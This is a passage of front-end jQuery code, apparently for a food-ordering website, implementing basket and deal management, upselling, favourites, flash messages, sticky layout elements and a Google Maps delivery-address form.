      Flash.itemRemoved(deal_item_name)
      ajaxPost(url, 'basket')
    },

    // ------------------
    // Actions
    // ------------------
    action: function (_form, name) {
      Basket.actionWithCallback(_form, name, $j.noop)
    },

    actionWithCallback: function (_form, name, callback) {
      var form = $j(_form),
          action = form.attr('data-action'),
          page = form.attr('data-page')
      switch (action) {
        case 'create-item':
          Basket.createItemWithCallback(form, name, page, callback)
          break
        case 'update-item':
          Basket.updateItemWithCallback(form, name, page, callback)
          break
        case 'update-deal-item':
          Basket.updateDealItemWithCallback(form, name, page, callback)
          break
        case 'create-deal':
          Basket.createDealWithCallback(form, name, page, callback)
          break
        case 'update-deal':
          Basket.updateDealWithCallback(form, name, page, callback)
          break
      }
    },

    // ------------------
    // Shortcuts
    // ------------------
    createItem: function (_form, item_name) {
      Basket.createItemWithCallback(_form, item_name, 'basket', $j.noop)
    },

    createMultipleItems: function (_forms) {
      Basket.createMultipleItemsWithCallback(_forms, $j.noop)
    },

    updateItem: function (_form, item_name) {
      Basket.updateItemWithCallback(_form, item_name, 'basket', $j.noop)
    },

    updateDealItem: function (_form, item_name) {
      Basket.updateDealItemWithCallback(_form, item_name, 'basket', $j.noop)
    },

    createDeal: function (_form, deal_name) {
      Basket.createDealWithCallback(_form, deal_name, 'basket', $j.noop)
    },

    updateDeal: function (_form, deal_name) {
      Basket.updateDealWithCallback(_form, deal_name, 'basket', $j.noop)
    },

    // ------------------
    // Item/deal quantity
    // ------------------
    increaseItemQuantity: function (basket_item_key, item_name) {
      var url = '/basket_items/increase_quantity/' + basket_item_key
      Flash.itemUpdated(item_name)
      ajaxPost(url, 'basket')
    },

    decreaseItemQuantity: function (basket_item_key, item_name) {
      var url = '/basket_items/decrease_quantity/' + basket_item_key
      Flash.itemUpdated(item_name)
      ajaxPost(url, 'basket')
    },

    decreaseItemQuantityByProduct: function (product, item_name) {
      var url = '/basket_items/remove_one/' + product
      Flash.itemUpdated(item_name)
      ajaxPost(url, 'basket')
    },

    decreaseDealQuantityByProduct: function (product, item_name) {
      var url = '/deal_bags/remove_one/' + product
      Flash.itemUpdated(item_name)
      ajaxPost(url, 'basket')
    },

    // ------------------
    // Busy indicator
    // ------------------
    showBusy: showBusy,

    hideBusy: hideBusy,

    // ------------------
    // Manual update
    // ------------------
    updateContent: function (data) {
      updateBasketOrPopup('basket', data)
    },

    // ------------------
    // Clear basket
    // ------------------
    clear: function () {
      ajaxPost('/basket/clear', 'basket')
      Flash.basketEmptied()
    },

    // ------------------
    // Order repeat
    // ------------------
    repeatOrder: function (url, form) {
      ajaxPostForm(url, form, 'basket', null)
    },

    repeatOrderItem: function (url, form) {
      ajaxPostForm(url, form, 'basket', null)
    },

    // ------------------
    // Tips
    // ------------------
    increaseTip: function (page_name) {
      ajaxPost('/basket_tips/increase', page_name)
    },

    decreaseTip: function (page_name) {
      ajaxPost('/basket_tips/decrease', page_name)
    },

    setTip: function (tip_cents, page_name) {
      ajaxPost('/basket_tips/set?tip_cents=' + tip_cents, page_name)
    },

    // ------------------
    // Floating Extra Charge
    // ------------------

    setFloatingExtraCharge: function (floating_extra_charge_id, amount) {
      let url = '/basket/set_floating_extra_charge';
      let data = {
        floating_extra_charge_id: floating_extra_charge_id,
        amount: amount
      };
      $j.ajax({
        url: url,
        type: 'post',
        data: data
      }).done(function (data) {
      });
    },

    clearFloatingExtraCharge: function () {
        let url = '/basket/clear_floating_extra_charges';
        $j.ajax({
            url: url,
            type: 'post'
        }).done(function (data) {
        });
    },

    // ------------------
    // Coupon codes
    // ------------------
    setCouponCode: function (coupon_code) {
      var page_name = basketPage()
      ajaxPost('/coupon_code?code=' + encodeURIComponent(coupon_code) + '&page=' + page_name, page_name)
    },

    deleteCouponCode: function () {
      var page_name = basketPage()
      ajaxPost('/coupon_code?code=&page=' + page_name, page_name)
    },

    addCouponProduct: function () {
      var product_handle = selectedCouponProductHandle(),
          page_name = basketPage()

      if (product_handle !== '') {
        var product_name = $j('#coupon_form option:selected').html()
        Flash.itemAdded($j('#coupon_form'), product_name)

        var sku_handle = selectedCouponSkuHandle()
        ajaxPostForm('/basket_items/create/' + product_handle, $j('#coupon_form'), page_name, sku_handle)
      }
    },

    // ------------------
    // Date/time/method
    // ------------------
    // Target can be either 'basket' or 'step_basket'
    changeDeliveryMethod: function (target, delivery_method) {
      changeDateTimeMethod(target, 'delivery_method=' + delivery_method)
    },

    changeTime: function (target, order_time) {
      changeDateTimeMethod(target, 'sc_order_time=' + order_time)
    },

    changeDate: function (target, order_day) {
      changeDateTimeMethod(target, 'sc_order_day=' + order_day)
    }

  }
}())
/*****************************
 BasketUpselling
 *****************************/

var BasketUpselling = (function () {
  var changed = function () {
    $j('[data-basket-upselling] select').each(function () {
      var select = $j(this),
          form = select.closest('form'),
          option = select.find('option:selected')
      form.attr('data-product', option.val())
      form.attr('data-sku', option.attr('data-default-sku'))
    })
  }

  // This method should be called immediately after the upselling block, and not in a $j(document).ready(...),
  // since the data-product and data-sku need to be defined before the product.js methods are called.
  var init = function (number_to_show) {
    $j('[data-basket-upselling]').showRandomly(number_to_show)
    $j('[data-basket-upselling] select').change(changed)
    changed()
  }

  return {
    init: init
  }
}())
/*****************************
 CheckoutUpselling
 *****************************/

var CheckoutUpselling = (function () {
  var default_item_name

  var init = function (_default_item_name, number_to_show) {
    default_item_name = _default_item_name
    $j('[data-checkout-upselling]').showRandomly(number_to_show)
  }

  var createItem = function (form, item_name) {
    Basket.synchronousCreateItemInStepBasket(form, item_name || default_item_name)
  }

  var refresh = function () {
    if ($j('[data-checkout-upselling-container]').length == 0) return

    $j.ajax({
      url: '/step3_upselling',
      type: 'get'
    }).done(function (data) {
      $j('[data-checkout-upselling-container]').replaceWith(data)
      NiceSelect.init()
    })

  }

  return {
    init: init,
    createItem: createItem,
    refresh: refresh
  }
}())
/*****************************
 ClickablePromotion
 *****************************/

var ClickablePromotion = (function () {
  // number_to_show: leave null to show all promotions
  var init = function (number_to_show) {
    if (number_to_show) {
      $j('[data-clickable-promotion]').showRandomly(number_to_show)
    } else {
      $j('[data-clickable-promotion]').show()
    }
  }

  return {
    init: init
  }
}())
/*****************************
 CreditPage
 *****************************/

var CreditPage = (function () {
  var init = function () {
    Util.showMore($j('[data-credit-show-more]'), $j('[data-credit-row]'), 5)
  }

  return {
    init: init
  }
}())

/*********************************************
  Custom off-canvas menu
 *********************************************/
/*
  This supposts simple off-canvas type menu
  It requires 3 elements to make it working:
  - button with attribute [data-offcanvas-button]
  - close button with attribute [data-offcanvas-close-button]
  - layout that includes menu content with attribute [data-offcanvas-container]
  - page overlay: we use one we have already "#page-overlay"
*/

// Off-canvas

var customOffCanvas = ( function () {
  var offCanvasButton
  var offCanvasCloseButton
  var offCanvasLayout
  var pageOverlay
  var openClassName


  var openOffCanvas = function () {
    if (offCanvasLayout.classList.contains(openClassName)) return

    offCanvasLayout.classList.add(openClassName)

    pageOverlay.addEventListener("click", overlayEvent, false)
    window.addEventListener("resize", windowResize, false)

    pageOverlay.style.display = "block"
  }

  var closeOffCanvas = function () {
    if (!offCanvasLayout.classList.contains(openClassName)) return

    offCanvasLayout.classList.remove(openClassName)

    pageOverlay.removeEventListener("click", overlayEvent)
    window.removeEventListener("resize", windowResize)

    pageOverlay.style.display = "none"
  }

  var openButtonEvent = function (event) {
    openOffCanvas()
  }

  var closeButtonEvent = function (event) {
    closeOffCanvas()
  }

  var overlayEvent = function (event) {
    closeOffCanvas()
  }

  var windowResize = function (event) {
    closeOffCanvas()
  }

  var init = function () {
    offCanvasButton = document.querySelector("[data-offcanvas-button]")
    offCanvasCloseButton = document.querySelector("[data-offcanvas-close-button]")
    offCanvasLayout = document.querySelector("[data-offcanvas-container]")
    pageOverlay = document.getElementById("page-overlay")
    openClassName = "open"

    offCanvasButton.addEventListener("click", openButtonEvent, false)
    offCanvasCloseButton.addEventListener("click", closeButtonEvent, false)
  }

  return {
    init: init
  }

})()/*****************************
 DealSelects
 *****************************/

var DealSelects = (function () {
  var dealItemSelected = function (select) {
    select.removeClass('popup-deal-line__select_error')

    var deal_item_nb = select.attr('name').match(/deal_item_(\d+)/)[1],
        sku_virtual_id = select.find(':selected').val(),
        product_handle = sku_virtual_id.split(':')[0],
        product_details = window.dealItemDetails[deal_item_nb][product_handle],
        description = (product_details ? product_details.description : undefined),
        thumbnail_url = (product_details ? product_details.thumbnail_url : undefined),
        deal_item = select.closest('[data-deal-item]'),
        deal_item_picture = deal_item.find('[data-deal-item-picture]'),
        deal_item_description = deal_item.find('[data-deal-item-description]')

    if (description) {
      deal_item_description.html(description)
      deal_item_description.show()
    } else {
      deal_item_description.hide()
      deal_item_description.html('')
    }

    if (thumbnail_url) {
      deal_item_picture.find('img').attr('src', thumbnail_url)
      deal_item_picture.show()
    } else {
      deal_item_picture.hide()
      deal_item_picture.find('img').attr('src', '/assets-images/blank.gif')
    }
  }

  var validate = function (form) {
    var is_ok = true
    $j(form).find('[data-deal-item] .nice-select.popup-deal-line__select').removeClass('popup-deal-line__select_error').each(function (i, e) {
      var select = $j(e).closest('.nice-select__container').prev('select')
      if (!select.val()) {
        is_ok = false
        $j(e).addClass('popup-deal-line__select_error')
      }
    })
    return is_ok
  }

  var init = function (form) {
    form.find('[data-deal-item] select').each(function (i, _select) {
      var select = $j(_select)
      select.change(function () {
        dealItemSelected(select)
      })
      dealItemSelected(select)
    })
  }

  return {
    init: init,
    validate: validate
  }
}())/*****************************
 DealWizard
 *****************************/

var DealWizard = (function () {
  var selected_items,
      deal_id,
      product_deal_handle,
      deal_name,
      line_nb,
      in_creation

  var showTab = function () {
    $j('.deal-wizard-navigation__tab_active').removeClass('deal-wizard-navigation__tab_active')
    $j('a[href=deal-wizard-set-' + line_nb + ']').closest('.deal-wizard-navigation__tab').addClass('deal-wizard-navigation__tab_active')

    $j('.deal-wizard-set_active').removeClass('deal-wizard-set_active')
    $j('#deal-wizard-set-' + line_nb).addClass('deal-wizard-set_active')

    Page.equalizeProducts()

    $j('body,html').animate({
      scrollTop: 0
    }, 400)
  }

  var navigationClickHandler = function (event) {
    event.preventDefault()
    var link_href = $j(event.target.closest('a')).attr('href'),
        new_line_nb = /deal-wizard-set-([0-9]+)$/i.exec(link_href)[1]

    if (new_line_nb == 1 || selected_items[new_line_nb - 1] !== undefined) {
      line_nb = new_line_nb
      showTab()
    }
  }

  var nbLines = function () {
    return $j('.deal-wizard-set').size()
  }

  var gotoNextLine = function () {
    // line_nb is incremented a first time according to the definition "Next"
    line_nb++

    // while there is only one product form marked as data-single_choice
    for (; line_nb <= nbLines(); line_nb++) {
      var forms = $j('#deal-wizard-set-' + line_nb + ' .product__form[data-single-choice="true"]')
      if (forms.length != 1) {
        // The first group with a non-single choice breaks the "Next" loop
        break
      }
      // The single choice is automatically selected
      fillSelectedItems(getSkuId(forms[0]))
    }

    if (line_nb > nbLines()) {
      line_nb = nbLines()
      create()
    }

    // accordingly with the "goto" definition
    showTab()
  }

  var getSkuId = function (form) {
    var product = $j(form).attr('data-product'),
        sku = $j(form).attr('data-sku')
    return product + (sku ? ':' + sku : '')
  }

  var fillSelectedItems = function (sku_id) {
    selected_items[line_nb] = {
      sku_id: sku_id,
      quantity: 1,
      item: {},
      options: {}
    }
  }

  var create = function () {
    // Prevent double click on last item to create the deal twice
    if (in_creation) return
    in_creation = true

    var ajax_data = {
      page: 'basket'
    }

    selected_items.forEach(function (selected_item, line_nb) {
      ajax_data['deal_item_' + line_nb] = selected_item.sku_id
      if (Object.keys(selected_item.options).length > 0) {
        ajax_data['deal_item_' + line_nb + '_options'] = selected_item.options
      }
    })

    Basket.showBusy()

    $j.ajax({
      url: Util.addKeyValueToURL('/deal_bags/create', 'product_handle', product_deal_handle),
      type: 'post',
      data: JSON.stringify(ajax_data),
      contentType: 'application/json'
    }).done(function (data) {
      Flash.itemAdded($j('<form></form>'), deal_name)
      Basket.updateContent(data)

      // Redirect
      var page = Util.getParameterFromUrl(window.location.href, 'redirect_to_page'),
          redirect_url = page ? '/' + page : '/categories'
      Util.redirect(redirect_url)
    })
  }

  // Public methods
  var init = function (handle, id, name) {
    selected_items = []
    product_deal_handle = handle
    deal_id = id
    deal_name = name
    in_creation = false

    $j('.deal-wizard-navigation__tab a').each(function () {
      $j(this).on('click', navigationClickHandler)
    })

    line_nb = 0
    gotoNextLine()
  }

  var newItem = function (form) {
    var sku_id = getSkuId(form)

    $j.ajax({
      url: Util.addParametersToURL('/deal_editor/edit/' + sku_id, 'page=deal_wizard_popup&deal_line_number=' + line_nb + '&deal_id=' + deal_id),
      type: 'post'
    }).done(function (data) {
      $j('#popup-holder').html(data)
      selected_items[line_nb] = {
        sku_id: sku_id,
        quantity: 1,
        item: {},
        options: {}
      }
    })
  }

  var createItem = function (form) {
    fillSelectedItems(getSkuId(form))
    gotoNextLine()
  }

  var itemCreated = function (form) {
    var options = {}

    form.find('input:checked, option:selected, input[type="hidden"]').each(function (i, el) {
      var name = (el.tagName == 'OPTION' ? $j(el).closest('select')[0] : el).name,
          array = /^item\[([^\]]*)\]$/.exec(name)
      if (array) {
        var option_name = array[1]
        if (option_name !== 'sku') {
          options[option_name] = el.value
        }
      }

      array = /^item\[([^\]]*)\]\[\]$/.exec(name)
      if (array) {
        var option_name = array[1]
        if (!(option_name in options)) {
          options[option_name] = []
        }
        options[option_name].push(el.value)
      }
    })

    selected_items[line_nb].sku_id = getSkuId(form)
    selected_items[line_nb].options = options

    Popup.close()

    gotoNextLine()
  }

  return {
    init: init,
    newItem: newItem,
    createItem: createItem,
    itemCreated: itemCreated
  }
})()
/*****************************
 Dropdown
 *****************************/
var Dropdown = (function () {
  var active

  var init = function () {
    // Listen to external event to close any drop-down
    $j(window).on('close-all-dropdowns', closeActive)

    // Open/close dropdown when the toggle is clicked
    $j('[data-dropdown-toggle]').each(function () {
      var toggle = $j(this),
          dropdown = toggle.closest('[data-dropdown]')

      // Dropdown body should not react to click
      dropdown.click(function (e) {
        e.stopPropagation()
      })

      toggle.on('click', function (e) {
        e.preventDefault()
        e.stopPropagation()

        if (dropdown.attr('data-dropdown-open') == undefined) {
          open(dropdown)
        } else {
          closeActive()
        }
      })
    })
  }

  var open = function (dropdown) {
    // Only one dropdown can be open at any time
    $j(window).trigger('close-all-dropdowns')

    // Open the menu dropdown
    active = dropdown
    dropdown.attr('data-dropdown-open', '')

    $j('body').on('click', closeActive)
  }

  var closeActive = function () {
    if (!active) return

    active.removeAttr('data-dropdown-open')
    active = null

    $j('body').off('click', closeActive)
  }

  return {
    init: init
  }
}())
/*****************************
 EmailVerification
 *****************************/

var EmailVerification = (function () {
  var sendEmail = function (recipient_email_address) {
    $j.ajax({
      url: '/email_verification',
      type: 'post',
      data: recipient_email_address ? { recipient_email_address: recipient_email_address } : {},
      dataType: 'json'

    }).done(function (data) {
      $j('[data-email-verification-step1]').toggle(!!data.error)
      $j('[data-email-verification-step2]').toggle(!data.error)

      $j('[data-email-verification-error-cannot-send]').toggle(data.error === 'cannot_send')
    })
  }

  var checkCode = function (email_verification_code) {
    $j.ajax({
      url: '/email_verification',
      type: 'delete',
      data: { email_verification_code: email_verification_code },
      dataType: 'json'
    }).done(function (data) {
      if (data.success) {
        $j('[data-email-verification-success]').show()
        Util.redirect(window.location.href)
      } else {
        $j('[data-email-verification-error-invalid-code]').show()
      }
    })
  }

  return {
    sendEmail: sendEmail,
    checkCode: checkCode
  }
}())
/*****************************
 Favourites
 *****************************/

var Favourites = (function () {
  var buyer_favourites

  var authenticity_token

  function init (_buyer_favourites, _authenticity_token) {
    buyer_favourites = _buyer_favourites
    authenticity_token = _authenticity_token

    $j('[data-favourite-product]').addClass('product__favourite_add').css('display', 'inline-block')

    $j.each(buyer_favourites, function () {
      var product_handle = this[1]
      $j('[data-favourite-product=' + product_handle + ']').removeClass('product__favourite_add').addClass('product__favourite_remove')
    })
  }

  function toggle (link) {
    var product_handle = $j(link).attr('data-favourite-product')
    if (!product_handle) return

    var buyer_favourite_id
    $j.each(buyer_favourites, function () {
      if (this[1] == product_handle) buyer_favourite_id = this[0]
    })

    if (buyer_favourite_id) {
      // Remove favourite
      $j.ajax({
        url: '/buyer_favourites/destroy/' + buyer_favourite_id,
        type: 'post',
        data: 'page=favourites_reset&authenticity_token=' + encodeURIComponent(authenticity_token),
        dataType: 'script'
      })
      $j(link).removeClass('product__favourite_remove').addClass('product__favourite_add')

      // If we are on the favourites page, hide the product
      if ($j('body.page_favourites').length > 0) {
        setTimeout(function () {
          $j(link).closest('.product').hide(250)

          // Show the "no favourite" message if applicable
          if ($j('[data-favourite-product]').not('[data-favourite-product=' + product_handle + ']').closest('.product:visible').length == 0) {
            setTimeout(function () {
              $j('.category__no-favourite').show()
            }, 350)
          }
        }, 200)
      }

    } else {
      // Add favourite
      $j.ajax({
        url: '/buyer_favourites/create/' + product_handle,
        type: 'post',
        data: 'page=favourites_reset&authenticity_token=' + encodeURIComponent(authenticity_token),
        dataType: 'script'
      })
      $j(link).removeClass('product__favourite_add').addClass('product__favourite_remove')
    }
  }

  return {
    init: init,
    toggle: toggle
  }
}())
/*******************
 Feedback Form
 *******************/
var FeedbackForm = (function () {
  var form;

  var init = function (_form) {
    form = $j(_form);
    form.find('button[type=submit]').click(validate);
  };

  var validate = function () {
    var valid = true;

    form.find('[data-form-required]').removeClass('checkout-row__warning').each(function () {
      var input = $j(this);
      if (!input.val()) {
        input.addClass('checkout-row__warning');
        valid = false;
      }
    });

    return valid;
  };

  return {
    init: init
  };
})();
/*****************************
 FixedTopbar
 ****************************************/

var FixedTopbar = (function () {
  var desktop_topbar,
      mobile_topbar,
      topbar,
      is_fixed,
      is_mobile,
      topbar_top,
      topbar_height,
      fix_callback,
      unfix_callback

  var fix = function () {
    $j('.page__topbar').height(topbar_height)
    topbar.addClass('fixed-topbar')
    $j('body').addClass('topbar-fixed')

    is_fixed = true
    if (fix_callback) fix_callback()
  }

  var unfix = function () {
    $j('.page__topbar').height(0)
    topbar.removeClass('fixed-topbar')
    $j('body').removeClass('topbar-fixed')

    topbar_top = parseInt($j(topbar).offset().top) // parseInt fixes IE bug when offset().top returns negative value
    topbar_height = topbar.outerHeight(false)

    is_fixed = false
    if (unfix_callback) unfix_callback()
  }

  var scrolled = function () {
    if (!topbar) return

    var scroll_position = $j(window).scrollTop()
    if (scroll_position <= topbar_top) {
      if (is_fixed) unfix()
    } else {
      if (!is_fixed) fix()
    }
  }

  var resize = function () {
    var was_mobile = is_mobile
    is_mobile = $j('.header__burger-menu').is(':visible')

    if (is_mobile !== was_mobile) {
      if (topbar) unfix() // Unfix previous topbar before we switch
      topbar = is_mobile ? mobile_topbar : desktop_topbar
      if (topbar) unfix()
    }

    scrolled()

    Floater.setTopbarHeight(topbar ? topbar_height : 0)
  }

  var init = function (_desktop_selector, _mobile_selector, options) {
    if (_desktop_selector) {
      desktop_topbar = $j(_desktop_selector)
      if (desktop_topbar.size() == 0) desktop_topbar = null
    }
    if (_mobile_selector) {
      mobile_topbar = $j(_mobile_selector)
      if (mobile_topbar.size() == 0) mobile_topbar = null
    }

    fix_callback = options['fix_callback']
    unfix_callback = options['unfix_callback']

    $j(window).on('resize', resize)
    $j(window).on('scroll', scrolled)

    resize()
  }

  var height = function () {
    scrolled()

    return $j('.fixed-topbar').outerHeight()
  }

  return {
    init: init,
    height: height
  }
}())
/*****************************
 Flash
 *****************************/

var Flash = (function () {
  var display = function (text) {
    var message = $j('#message-fadeout')

    if (message.is(':visible')) {
      clearTimeout(message.data('timer'))
      message.stop().css({ opacity: '100' })
      message.fadeOut(60).fadeIn(60)
    }

    message.find('.message__content').replaceWith('<div class="message__content">' + text + '</div>').show()

    message.data('timer', setTimeout(function () {
      message.fadeOut(200)
    }, 1500))
    message.show()
  }

  var displayForItem = function (form, product_name, operation) {
    if (!product_name) return
    var message
    switch (operation) {
      case 'added':
        // quantity is undefined for deal products
        var quantity = form.find('.quantity option:selected').val(),
            product_name_with_qty = (quantity == undefined || quantity == 1) ? product_name : (quantity + ' x ' + product_name)
        message = locProductAdded(product_name_with_qty)
        break
      case 'updated':
        message = locProductUpdated(product_name)
        break
      case 'removed':
        message = locProductRemoved(product_name)
        break
      default:
        console.error('Incorrect operation called in displayForItem: ' + operation)
        break
    }
    display(message)
  }

  var show = function (flash, time) {
    flash.show()
    setTimeout(function () {
      flash.fadeOut(200)
    }, time)
  }

  var displayFreeMessage = function (message, text, time) {
    if (message.is(':visible')) {
      clearTimeout(message.data('timer'))
    }
    message.find('.message__content').html(text)

    message.data('timer',setTimeout( function() { message.fadeOut(200) }, time))
    message.show()
  }

  var showInfo = function () {
    show($j('#flash-info'), 2500)
  }

  var showError = function () {
    show($j('#flash-error'), 5000)
  }

  return {
    itemAdded: function (form, product_name) {
      displayForItem(form, product_name, 'added')
    },

    itemUpdated: function (product_name) {
      displayForItem(null, product_name, 'updated')
    },

    itemRemoved: function (product_name) {
      displayForItem(null, product_name, 'removed')
    },

    basketEmptied: function () {
      display(locBasketEmptied())
    },

    showInfo: showInfo,

    showError: showError,

    displayFreeMessage: displayFreeMessage
  }
}())
/*****************************
 Floater
 *****************************/

var Floater = (function () {
  var elements = [], // [[jQuery element, {top: ..., left: ..., width: ...}], ...]
      topbar_height = 0,
      content_height,
      footer_top,
      footer_height,
      enabled,
      initialized

  // content__side.floater-fixed { margin-top: 5px; margin-bottom: 10px; }
  var FLOATER_FIXED_TOP_MARGIN = 5
  var FLOATER_FIXED_BOTTOM_MARGIN = 10

  var resize = function () {
    var is_desktop = !$j('.header__burger-menu').is(':visible')
    if (enabled !== is_desktop) {
      if (is_desktop) {
        $j(window).on('scroll', scroll)
      } else {
        $j(window).off('scroll', scroll)

        // Basket off-canvas bug fix
        $j('.content__side.floater-fixed').removeClass('floater-fixed').attr('style', '')
      }
      enabled = is_desktop
    }

    if (enabled) {
      $j.each(elements, function () {
        var element = this[0],
            parameters = this[1]

        setPosition(element, 'static', '', '', '', '')
        var offset = element.offset(),
            position = element.position()

        parameters['top'] = offset.top
        parameters['left'] = offset.left
        parameters['absolute_left'] = position.left
        parameters['width'] = element.width()
      })

      content_height = $j('.content__wrapper').height()

      var footer = $j('.page__footer')
      footer_top = footer.offset().top
      footer_height = footer.outerHeight(false)

      scroll()
    }
  }

  var scroll = function () {
    var scroll_position = $j(window).scrollTop()

    $j.each(elements, function () {
      var element = this[0],
          parameters = this[1],
          top = parameters['top'],
          left = parameters['left'],
          absolute_left = parameters['absolute_left'],
          width = parameters['width'],
          height = element.outerHeight(false),
          upper_bound = top - topbar_height - FLOATER_FIXED_TOP_MARGIN,
          lower_bound = footer_top - height - topbar_height - FLOATER_FIXED_TOP_MARGIN - FLOATER_FIXED_BOTTOM_MARGIN
      if (
          height >= content_height ||
          height >= $j(window).height() - topbar_height - FLOATER_FIXED_TOP_MARGIN ||
          scroll_position <= upper_bound
      ) {
        setPosition(element, 'static', '', '', '', '')
        element.removeClass('floater-fixed')
      } else if (scroll_position >= lower_bound) {
        setPosition(element, 'fixed', left, width, '', $j(window).height() - (footer_top - scroll_position))
        element.addClass('floater-fixed')
      } else {
        setPosition(element, 'fixed', left, width, topbar_height, '')
        element.addClass('floater-fixed')
      }
    })
  }

  var setPosition = function (element, position, left, width, top, bottom) {
    element.css({
      'position': position,
      'left': left,
      'width': width,
      'top': top,
      'bottom': bottom
    })
  }

  var setTopbarHeight = function (height) {
    topbar_height = height
  }

  var addElement = function (selector) {
    var element = $j(selector)
    if (element.length > 0) {
      elements.push([element, {}])
      if (!initialized) {
        $j(window).on('load resize', resize)
        initialized = true
      }
    }
  }

  return {
    setTopbarHeight: setTopbarHeight,
    addElement: addElement,
    resize: function () {
      if (initialized) {
        resize()
      }
    }
  }
}())
/*****************************
 Google Checkout Address
 *****************************/

var GoogleCheckoutAddress = (function () {
  var googleApiKey,
      jElements,
      geocoder,
      mapModal,
      state = {}

  var StateMachine = function () {
    var that = this

    var elements = {
      default: [jElements.defaultSection, jElements.defaultFooter],
      map: [jElements.mapSection],
      form: [jElements.formSection]
    }

    // called by changeState and defaultState
    var actions = {
      default: function () {
        that.showElements('default')
      },

      map: function () {
        if (!mapModal) {
          mapModal = new MapModal()
        }

        mapModal.center()
        that.showElements('map')
      },

      form: function () {
        that.showElements('form')
        jElements.errorAddressMessage.hide()
        jElements.errorMessage.hide()
      }
    }

    this.showElements = function (stateName) {
      var applyToArrayFunc = function (els, action) {
        els.forEach(function (el) {
          el[action]()
        })
      }
      Object.keys(elements).forEach(function (key) {
        applyToArrayFunc(elements[key], 'hide')
      })
      applyToArrayFunc(elements[stateName], 'show')
    }

    this.changeState = function (stateName) {
      actions[stateName]()
    }

    this.showElements('default')
  }

  var Geocoder = function () {
    var map = new google.maps.Map($j('<div/>')),
        service = new google.maps.places.PlacesService(map)

    this.getPlaceFromQuery = function (query) {
      service.findPlaceFromQuery({
        query: query,
        fields: ['geometry']
      }, function (results, status) {
        if (status === google.maps.places.PlacesServiceStatus.OK) {
          return results[0]
        }
      })

      return null
    }
  }

  var MapModal = function () {
    var map = new google.maps.Map(jElements.mapElement[0], { zoom: 18 })
    var marker = new google.maps.Marker({ map: map, draggable: true })

    this.center = function () {
      let latLng = { lat: state.shopLocation.lat, lng: state.shopLocation.lng } // use shop position as default map center
      if (state.lpAddress != undefined && state.lpAddress.latitude != undefined)
        latLng = { lat: state.lpAddress.latitude, lng: state.lpAddress.longitude }
      latLng = new google.maps.LatLng(latLng.lat, latLng.lng)

      map.setCenter(latLng)
      map.setZoom(18)
      marker.setPosition(latLng)
    }

    google.maps.event.addListener(marker, 'dragend', async function () {
      var latLng = marker.getPosition()

      // update state from marker position
      state.lpAddress.setLatLng(latLng)
      state.lpAddress = await LpAddress.createFromLatLng(latLng)

      // update forms fields (address confirmation and geocoder)
      updateAddressFields(state.lpAddress)

      jElements.geoCoder.val(state.lpAddress.toString())
      AddressForm.updateAddress(state.lpAddress)
      AddressForm.updateFields(state.lpAddress)
    })
  }

  var AddressForm = (function () {
    var updateFields = function (lpAddress) {
      ['address1', 'address2', 'postal_code', 'city', 'latitude', 'longitude'].forEach(function (field) {
        var $field = jElements.root.find('#' + field)
        $field.val(lpAddress ? lpAddress[field] : null)
      })
    }

    var updateAddress = function (lpAddress) {
      ['address1', 'address2', 'postal_code', 'city'].forEach(function (field) {
        var $field = jElements.root.find('#' + field)
        lpAddress[field] = $field.val()
      })
    }

    return {
      updateFields: updateFields,
      updateAddress: updateAddress
    }
  })()

  function init (options) {
    var rootValue = $j('[google-edit-buyer]').length ? '[google-edit-buyer]' : '[data-checkout-area-form-delivery]'
    var jRoot = $j(rootValue)
    jElements = {
      root: jRoot,
      defaultSection: jRoot.find('[data-section-default-delivery-types]'),
      defaultFooter: jRoot.find('[data-footer-default-delivery-types]'),
      mapSection: jRoot.find('[data-section-map]'),
      formSection: jRoot.find('[data-section-form]'),
      geoCoder: jRoot.find('[data-geocoder-search]'),
      fullAddresses: jRoot.find('[data-checkout-full-addresses]')[0].getAttribute('data-checkout-full-addresses'),
      errorMessage: jRoot.find('[data-checkout-area-form-error-message]'),
      errorAddressMessage: jRoot.find('[data-google-error-message]'),
      mapElement: jRoot.find('[data-map-target-element]'),
      editBuyer: rootValue === '[google-edit-buyer]'
    }

    if (jElements.editBuyer) {
      jElements.formSection.hide()
      updateClass()
    }

    jElements.errorAddressMessage.hide()
    googleApiKey = options.api_key

    state.machine = new StateMachine()

    state.needEdit = !!(options.overridden_lp_address || !options.buyer_lp_address)

    state.googleForceMap = !!options.google_force_map

    state.shopLocation = options.shop_location

    if (!state.needEdit) {
      state.skipMap = true
    }

    var lpAddress = options.overridden_lp_address || options.buyer_lp_address
    if (lpAddress) {
      jElements.geoCoder.val(lpAddress.toString())
      addressFound(lpAddress)
    } else {
      // avoid errors in MapModal creation
      state.lpAddress = new LpAddress()
    }

    jElements.geoCoder.change(function () {
      if (jElements.geoCoder.val() != state.addressFound) {
        // User changed the address without selecting a result or pressing Enter key
        state.addressFound = null
        state.needEdit = true
        state.skipMap = false
        enableAddressFields()
        jElements.errorAddressMessage.hide()
      }
    })

    jElements.autocomplete = new google.maps.places.Autocomplete(jElements.geoCoder[0])
    jElements.autocomplete.setFields(['address_components', 'geometry'])
    jElements.autocomplete.addListener('place_changed', function () {
      var place = jElements.autocomplete.getPlace()
      state.needEdit = true
      state.skipMap = false
      if (state.googleForceMap) {
        addressFound(LpAddress.createFromPlace(place)) // center map on latest place
        changeState('map')
      }
      enableAddressFields()

      // This test will fails when user entered the name of a Place that was not suggested and
      // pressed the Enter key, or the Place Details request failed.
      if (!state.googleForceMap && place.geometry) {
        addressFound(LpAddress.createFromPlace(place))
        jElements.formSection.show()
        disableAddressFields()
      }
    })

    // Bias the autocomplete results within a 15km circle around the restaurant.
    var circle = new google.maps.Circle({ center: options.shop_location, radius: 15 })
    jElements.autocomplete.setBounds(circle.getBounds())
  }

  function updateClass () {
    jElements.root.find('.checkout-variant__select').toggleClass('checkout-variant__select checkout-row__group')
    jElements.root.find('.checkout-variant__select-label').toggleClass('checkout-variant__select-label checkout-row__label')
    jElements.root.find('.checkout-variant__select-set').toggleClass('checkout-variant__select-set checkout-row__group')
  }

  function usePrefilledAddress () {
    disableAddressFields()
    changeState('form')
  }

  function disableAddressFields () {
    ['address1', 'address2', 'city', 'postal_code'].forEach(function (field) {
      var $field = jElements.formSection.find('#' + field)
      if ($field && $field[0] && $field[0].value) {
        $field.prop('disabled', true)
      }
    })
  }

  function enableAddressFields () {
    // called on sendBuyerForm and check if jElements is created
    if (!jElements) {
      return
    }
    ['address1', 'address2', 'city', 'postal_code'].forEach(function (field) {
      var $field = jElements.formSection.find('#' + field)
      $field.prop('disabled', false)
    })
  }

  // update address confirmation fields
  function updateAddressFields (lpAddress) {
